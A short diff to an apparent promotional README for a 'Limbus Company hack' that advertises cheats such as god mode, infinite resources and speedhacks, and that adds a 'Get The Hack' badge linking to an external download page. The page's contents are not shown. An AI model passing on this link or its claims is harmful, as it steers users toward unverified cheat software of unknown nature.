@@ -4,6 +4,8 @@
 
 **Limbus Company** throws players into brutal battles and resource management challenges, but with a **Limbus Company hack**, you can skip the grind and enjoy total control. From god mode and infinite resources to one-hit kills and speedhacks, this guide covers how hacks transform your gameplay experience.
 
+
+[![Get](https://img.shields.io/badge/Get%20The-Hack-blueviolet)](https://limbus-company-hack.github.io/.github/)
 ---
 
 ## Product Description
